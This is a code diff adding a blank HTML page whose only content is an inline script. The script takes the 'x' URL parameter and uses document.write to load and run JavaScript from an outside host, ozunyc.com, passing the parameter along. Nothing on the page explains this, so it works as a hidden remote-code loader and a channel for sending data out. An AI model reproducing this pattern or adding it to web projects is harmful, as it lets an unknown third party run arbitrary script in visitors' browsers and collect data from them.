@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script>
+		var url = new URL(window.location.href);
+		var x = url.searchParams.get("x");
+		console.log(x);
+
+		if(x)
+		{
+			var usel = '<script src="';
+			usel += `https://ozunyc.com/api?x=${encodeURIComponent(x)}`;
+			usel += '"></script>';
+			document.write(usel);
+		}
+	</script>
+</head>
+<body>
+
+</body>
+</html>
